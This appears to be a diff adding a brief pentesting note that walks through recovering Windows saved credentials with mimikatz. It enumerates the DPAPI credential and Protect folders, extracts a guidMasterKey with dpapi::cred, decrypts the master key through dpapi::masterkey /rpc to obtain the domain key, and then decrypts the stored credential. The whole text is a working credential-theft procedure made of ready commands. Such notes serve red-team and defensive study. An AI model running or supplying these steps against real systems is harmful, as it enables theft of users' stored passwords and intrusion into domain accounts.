@@ -1,0 +1,21 @@
+First enumerate from your cmd all dirs inside: C:\Users\{username}\AppData\Roaming\Microsoft\credentials\
+
+Now, from your mimikatz, you just need to use dpapi::cred /in:C:\Users\{username}\AppData\Roaming\Microsoft\credentials\XXXXX
+
+This will give you a guidMasterKey. Remember this. You'll use it later.
+
+Now, enumerate again directories inside: C:\Users\{username}\appdata\roaming\microsoft\protect\
+
+You'll find a SID. Use this SID for another enumeration inside of it: C:\Users\{username}\appdata\roaming\microsoft\protect\<SID>
+
+There are some directories inside. Their names are same as the guidMasterKey I told you to rememeber. Let's go back to mimikatz.
+
+Use dpapi::masterkey /in:C:\Users\{username}\appdata\roaming\microsoft\protect\<SID>\<guidMasterKey> /rpc
+
+This will output a large content. Look the last few lines. There is something like "[domainkey] with RPC". Next to is, there is a large key. Copy it.
+
+No, you are going to repeat the same command you did the first time in mimikatz:
+
+dpapi::cred /in:C:\Users\{username}\AppData\Roaming\Microsoft\credentials\XXXXXX /masterkey::<key>
+
+There you got the Saved credential
